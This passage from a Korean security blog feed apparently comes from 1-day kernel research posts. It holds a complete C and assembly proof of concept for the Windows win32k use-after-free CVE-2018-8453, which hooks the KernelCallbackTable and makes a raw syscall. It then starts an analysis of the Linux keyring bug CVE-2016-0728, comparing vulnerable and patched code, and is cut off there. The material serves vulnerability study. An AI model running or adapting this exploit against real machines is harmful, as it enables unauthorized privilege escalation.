class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;targetver.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">BOOLf3 = FALSE;</span><br><span class="line">BOOLbMSGSENT = FALSE;</span><br><span class="line">HWNDhMainWND;</span><br><span class="line">HWNDhSBWND;</span><br><span class="line">HWNDhSBWNDnew;</span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C PULONG64 <span class="title">GetKernelCallbackTableBase</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">EXTERN_C VOID <span class="title">SetWindowFNID</span><span class="params">(HWND hWnd, LONG64 FNID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span>  <span class="title">ULONG64</span><span class="params">(WINAPI *fct_fnDispatch64)</span><span class="params">(PULONG64)</span></span>;</span><br><span class="line">fct_fnDispatch64 fnDWORD, fnClientFreeWindowClassExtraBytes;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnDWORDCallBack</span><span class="params">(PULONG64 msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (bMSGSENT &amp;&amp; *msg) &#123;</span><br><span class="line">bMSGSENT = FALSE;</span><br><span class="line">DestroyWindow(hMainWND);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((f3==TRUE) &amp;&amp; (*(msg + <span class="number">1</span>) == <span class="number">0x70</span>) &amp;&amp; (*((PULONG64)(*msg)) == (ULONG64)hMainWND)) &#123;</span><br><span class="line"></span><br><span class="line">SendMessage(hSBWNDnew, WM_CANCELMODE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">fnDWORD(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnClientFreeWindowClassExtraBytesCallBack</span><span class="params">(PULONG64 msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (*(PULONG64)*((PULONG64)*(msg - <span class="number">11</span>)) == (ULONG64)hMainWND) &#123;</span><br><span class="line"></span><br><span class="line">hSBWNDnew = CreateWindowEx(<span class="number">0</span>, <span class="string">&quot;ScrollBar&quot;</span>, <span class="string">&quot;SB&quot;</span>, SWP_HIDEWINDOW | SB_HORZ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">SetWindowFNID(hMainWND, <span class="number">0x2A1</span>);</span><br><span class="line">SetCapture(hSBWNDnew);</span><br><span class="line">f3 = TRUE;</span><br><span class="line">&#125; </span><br><span class="line">fnClientFreeWindowClassExtraBytes(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORDOldProtect = <span class="number">0</span>;</span><br><span class="line">PULONG64CallbackTb = GetKernelCallbackTableBase();</span><br><span class="line"></span><br><span class="line">VirtualProtect(CallbackTb, <span class="number">512</span>, PAGE_READWRITE, &amp;OldProtect);</span><br><span class="line">CallbackTb += <span class="number">2</span>;</span><br><span class="line">fnDWORD = (fct_fnDispatch64)*CallbackTb;</span><br><span class="line">*CallbackTb = (ULONG64)fnDWORDCallBack;</span><br><span class="line"></span><br><span class="line">CallbackTb += <span class="number">124</span>;</span><br><span class="line">fnClientFreeWindowClassExtraBytes = (fct_fnDispatch64)*CallbackTb;</span><br><span class="line">*CallbackTb = (ULONG64)fnClientFreeWindowClassExtraBytesCallBack;</span><br><span class="line"></span><br><span class="line">WNDCLASSEXW wcex;</span><br><span class="line">wcex.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEX);</span><br><span class="line">wcex.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">wcex.lpfnWndProc = DefWindowProc;</span><br><span class="line">wcex.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">wcex.cbWndExtra = <span class="number">4</span>;</span><br><span class="line">wcex.hInstance = <span class="number">0</span>;</span><br><span class="line">wcex.hIcon = LoadIcon(<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">wcex.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);</span><br><span class="line">wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + <span class="number">1</span>);</span><br><span class="line">wcex.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">wcex.lpszClassName = <span class="string">L&quot;WNDCLASSMAIN&quot;</span>;</span><br><span class="line">wcex.hIconSm = LoadIcon(wcex.hInstance, <span class="literal">NULL</span>);</span><br><span class="line">RegisterClassExW(&amp;wcex); </span><br><span class="line"></span><br><span class="line">hMainWND = CreateWindowW(<span class="string">L&quot;WNDCLASSMAIN&quot;</span>, <span class="string">L&quot;CVE&quot;</span>, WS_DISABLED, <span class="number">2</span>, <span class="number">2</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">hSBWND = CreateWindowEx(<span class="number">0</span>, <span class="string">&quot;ScrollBar&quot;</span>, <span class="string">&quot;SB&quot;</span>, WS_CHILD | WS_VISIBLE | SBS_HORZ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">20</span>, hMainWND, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">bMSGSENT = TRUE;</span><br><span class="line"></span><br><span class="line">SendMessage(hSBWND, WM_LBUTTONDOWN, <span class="number">0</span>, <span class="number">0x00020002</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> GetKernelCallbackTableBase</span><br><span class="line"><span class="keyword">public</span> FuncInt3</span><br><span class="line"><span class="keyword">public</span> SetWindowFNID </span><br><span class="line">_TEXT SEGMENT</span><br><span class="line"></span><br><span class="line">GetKernelCallbackTableBase PROC</span><br><span class="line">;<span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">mov rax,gs:[<span class="number">60</span>h]</span><br><span class="line">lea rax,[rax+<span class="number">58</span>h]</span><br><span class="line">mov rax,[rax]</span><br><span class="line">ret</span><br><span class="line">GetKernelCallbackTableBase ENDP</span><br><span class="line"></span><br><span class="line">SetWindowFNID PROC</span><br><span class="line">mov r10,rcx;</span><br><span class="line">mov r11,rdx;</span><br><span class="line">mov eax,<span class="number">1095</span>h;</span><br><span class="line">syscall;</span><br><span class="line">ret;</span><br><span class="line">SetWindowFNID ENDP</span><br><span class="line"></span><br><span class="line">END</span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://bbs.pediy.com/thread-249021.htm">https://bbs.pediy.com/thread-249021.htm</a></p>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/1-day/">1-day</category>
      
      <category domain="https://pwnkidhn.github.io/tags/Windows-Kernel/">Windows Kernel</category>
      
      <category domain="https://pwnkidhn.github.io/tags/UAF/">UAF</category>
      
      <category domain="https://pwnkidhn.github.io/tags/CVE/">CVE</category>
      
      
      <comments>https://pwnkidhn.github.io/2020/12/02/2020-12-03-CVE-2018-8453/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>CVE-2016-0728</title>
      <link>https://pwnkidhn.github.io/2020/11/02/2020-11-03-CVE-2016-0728/</link>
      <guid>https://pwnkidhn.github.io/2020/11/02/2020-11-03-CVE-2016-0728/</guid>
      <pubDate>Mon, 02 Nov 2020 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;CVE-2016-0728 // Linux Kernel 1-day &lt;/center&gt;



&lt;h1 id=&quot;information&quot;&gt;&lt;a href=&quot;#information&quot; class=&quot;headerlink&quot; title=&quot;information&quot;&gt;&lt;/a&gt;information&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/70257118/95414395-c453b100-0968-11eb-82dd-79b6e5e9e596.png&quot; alt=&quot;제목 없음&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2016년,리눅스 커널에서 LPE(Local Privilege Escalation)취약점이 발견되었다.&lt;/li&gt;
&lt;li&gt;이 취약점은 2012년부터 존재했지만 2016년이 되어서야  취약점이 발견되었다.&lt;/li&gt;
&lt;li&gt;당시 수천만대의 Linux 개인 PC와 Server, 66%의 Android device(kit-kat)에 영향을 주었다.&lt;/li&gt;
&lt;li&gt;취약점은 32bit,64bit상관없이 발생하며, 4.4.1 버전 이전의 모든 리눅스 커널에서 발생한다.</description>
      
      
      
      <content:encoded><![CDATA[<center>CVE-2016-0728 // Linux Kernel 1-day </center><h1 id="information"><a href="#information" class="headerlink" title="information"></a>information</h1><p><img src="https://user-images.githubusercontent.com/70257118/95414395-c453b100-0968-11eb-82dd-79b6e5e9e596.png" alt="제목 없음"></p><ul><li>2016년,리눅스 커널에서 LPE(Local Privilege Escalation)취약점이 발견되었다.</li><li>이 취약점은 2012년부터 존재했지만 2016년이 되어서야  취약점이 발견되었다.</li><li>당시 수천만대의 Linux 개인 PC와 Server, 66%의 Android device(kit-kat)에 영향을 주었다.</li><li>취약점은 32bit,64bit상관없이 발생하며, 4.4.1 버전 이전의 모든 리눅스 커널에서 발생한다.<span id="more"></span><img src="https://user-images.githubusercontent.com/70257118/95419567-d4718d80-0974-11eb-97dc-8b0e95991573.png" alt="1"></li><li>취약점이 발생하는 환경은 다음과 같으며,  ubuntu 14.04 LTS 환경에서 증명해 보겠다.</li></ul><h1 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h1><h3 id="Integer-Overflow-trigger"><a href="#Integer-Overflow-trigger" class="headerlink" title="- Integer Overflow (trigger)"></a>- Integer Overflow (trigger)</h3><h3 id="Use-after-free-exploit"><a href="#Use-after-free-exploit" class="headerlink" title="- Use after free (exploit)"></a>- Use after free (exploit)</h3><ul><li>Integer Overflow 취약점이 존재하는 부분은 <code>keyctl</code>이라는 커맨드이다.</li><li><code>keyctl</code>은 리눅스의 <code>key</code>를 보유 및 관리하는 시스템이다.</li><li>keyring은 다른 key(다른 keyring을 포함할 수 있음)에 대한 링크가 포함된 특별한 유형의 key다.</li></ul><p><img src="https://user-images.githubusercontent.com/70257118/95422776-e48c6b80-097a-11eb-8eb9-d4f58ca5955e.png" alt="2"></p><ul><li>key는 암호 데이터, 인증 토큰에 대한 구조체이며 아래와 같다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> &#123;</span></span><br><span class="line">      <span class="keyword">atomic_t</span>                 usage;       <span class="comment">/* number of references */</span></span><br><span class="line">      <span class="keyword">key_serial_t</span>           serial;        <span class="comment">/* key serial number */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">key_type</span>      *<span class="title">type</span>;</span>        <span class="comment">/* type of key */</span></span><br><span class="line">      <span class="keyword">time_t</span>                     expiry;  <span class="comment">/* time at which key expires (or 0) */</span></span><br><span class="line">      <span class="keyword">uid_t</span>                       uid;           <span class="comment">/* UID */</span></span><br><span class="line">      <span class="keyword">gid_t</span>                       gid;           <span class="comment">/* GID */</span></span><br><span class="line">      <span class="keyword">key_perm_t</span>            perm;        <span class="comment">/* access permissions */</span></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">short</span>       quotalen;   <span class="comment">/* length added to quota */</span></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">short</span>       datalen;     <span class="comment">/* payload data length</span></span><br><span class="line"><span class="comment">      char                      *description;</span></span><br><span class="line"><span class="comment">      union &#123;</span></span><br><span class="line"><span class="comment">          unsigned long             value;</span></span><br><span class="line"><span class="comment">          void                            *data;</span></span><br><span class="line"><span class="comment">          struct keyring_list       *subscriptions;</span></span><br><span class="line"><span class="comment">      &#125; payload;                                 /* Actual security data */</span></span><br><span class="line">      ....</span><br><span class="line">      ....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/70257118/98777101-80eed580-2433-11eb-8d64-248ab5469aa7.png" alt="1"></p><ul><li><p>해당 취약점에서 중요한 변수는 <code>key-&gt;usage</code>이다.</p></li><li><p><strong>key-&gt;usage의 type은 atomic_t형으로 이는 int형과 같다.</strong></p></li><li><p>취약점이 발생하는 함수는 <code>join_session_keyring</code>이다.</p></li></ul><p><img src="https://user-images.githubusercontent.com/70257118/95425267-fa039480-097e-11eb-87b5-4820e5629540.png" alt="55"></p><ul><li><p>keyctl(KEYCTL_JOIN_SESSION_KEYRING, name)을 이용하여 현재의 세션에서 새로운 keyring을 생성할 수 있다.</p></li><li><p>name이 NULL일 경우 익명, NULL 이 아닐경우 해당 keyring에 이름을 지정할 수 있다.</p></li><li><p>keyring은 같은 이름의 keyring을 참조하여 서로 다른 프로세스에서 공유할 수 있다.</p></li><li><p>만약 하나의 keyring이 여러 프로세스에서 공유되고 있다면 usage라는 필드에 위치한 객체의 내부 reference count가 계속해서 증가하게 된다.</p></li></ul><h2 id="source-code-before-the-vulnerability-is-patched"><a href="#source-code-before-the-vulnerability-is-patched" class="headerlink" title="source code, before the vulnerability is patched"></a>source code, before the vulnerability is patched</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">join_session_keyring</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line"><span class="keyword">long</span> ret, serial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = prepare_creds();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">old = current_cred();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* if no name is provided, install an anonymous keyring */</span></span><br><span class="line"><span class="keyword">if</span> (!name) &#123;</span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">serial = <span class="keyword">new</span>-&gt;session_keyring-&gt;serial;</span><br><span class="line">ret = commit_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = serial;</span><br><span class="line"><span class="keyword">goto</span> okay;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* allow the user to join or create a named keyring */</span></span><br><span class="line">mutex_lock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* look for an existing keyring of this name */</span></span><br><span class="line">keyring = find_keyring_by_name(name, <span class="literal">false</span>); <span class="comment">// find_keyring_by_name increments keyring usage if a keyring was found</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(keyring) == -ENOKEY) &#123;</span><br><span class="line"><span class="comment">/* not found - try and create a new one */</span></span><br><span class="line">keyring = keyring_alloc(</span><br><span class="line">name, old-&gt;uid, old-&gt;gid, old,</span><br><span class="line">KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ | KEY_USR_LINK,</span><br><span class="line">KEY_ALLOC_IN_QUOTA, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(keyring)) &#123; </span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* we&#x27;ve got a keyring - now to install it */</span></span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, keyring);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line"></span><br><span class="line">commit_creds(<span class="keyword">new</span>);</span><br><span class="line">mutex_unlock(&amp;key_session_mutex); </span><br><span class="line"></span><br><span class="line">ret = keyring-&gt;serial; </span><br><span class="line">key_put(keyring); </span><br><span class="line">okay:</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">error2:</span><br><span class="line">mutex_unlock(&amp;key_session_mutex);</span><br><span class="line">error:</span><br><span class="line">abort_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="source-code-after-the-vulnerability-is-patched"><a href="#source-code-after-the-vulnerability-is-patched" class="headerlink" title="source code, after the vulnerability is patched"></a>source code, after the vulnerability is patched</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">join_session_keyring</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line"><span class="keyword">long</span> ret, serial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = prepare_creds();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">old = current_cred();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* if no name is provided, install an anonymous keyring */</span></span><br><span class="line"><span class="keyword">if</span> (!name) &#123;</span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">serial = <span class="keyword">new</span>-&gt;session_keyring-&gt;serial;</span><br><span class="line">ret = commit_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = serial;</span><br><span class="line"><span class="keyword">goto</span> okay;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* allow the user to join or create a named keyring */</span></span><br><span class="line">mutex_lock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* look for an existing keyring of this name */</span></span><br><span class="line">keyring = find_keyring_by_name(name, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(keyring) == -ENOKEY) &#123;</span><br><span class="line"><span class="comment">/* not found - try and create a new one */</span></span><br><span class="line">keyring = keyring_alloc(</span><br><span class="line">name, old-&gt;uid, old-&gt;gid, old,</span><br><span class="line">KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ | KEY_USR_LINK,</span><br><span class="line">KEY_ALLOC_IN_QUOTA, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">key_put(keyring);</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* we&#x27;ve got a keyring - now to install it */</span></span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, keyring);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line"></span><br><span class="line">commit_creds(<span class="keyword">new</span>);</span><br><span class="line">mutex_unlock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line">ret = keyring-&gt;serial;</span><br><span class="line">key_put(keyring);</span><br><span class="line">okay:</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">error2:</span><br><span class="line">mutex_unlock(&amp;key_session_mutex);</span><br><span class="line">error:</span><br><span class="line">abort_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> ret; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="the-difference-between-these-code"><a href="#the-difference-between-these-code" class="headerlink" title="the difference between these code"></a>the difference between these code</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Before</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//After</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">key_put(keyring); <span class="comment">//patched</span></span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>패치된 코드를 보면, else if 문에서 goto error2이전에 key_put(keyring)이라는 코드가 추가되었다.<h3 id="key-put"><a href="#key-put" class="headerlink" title="key_put()"></a>key_put()</h3></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">key_put</span><span class="params">(struct key *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (key) &#123;</span><br><span class="line">key_check(key);</span><br><span class="line"><span class="keyword">if</span> (refcount_dec_and_test(&amp;key-&gt;usage))</span><br><span class="line">schedule_work(&amp;key_gc_work);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(key_put);</span><br></pre></td></tr></table></figure><ul><li><p>key_put 함수는 해당 keyring의 usage (<code>reference count</code>) 를 감소시키는 역할을 한다.</p></li><li><p>추가적으로 <code>reference count</code>가 0이 되어 더이상 사용되지 않는 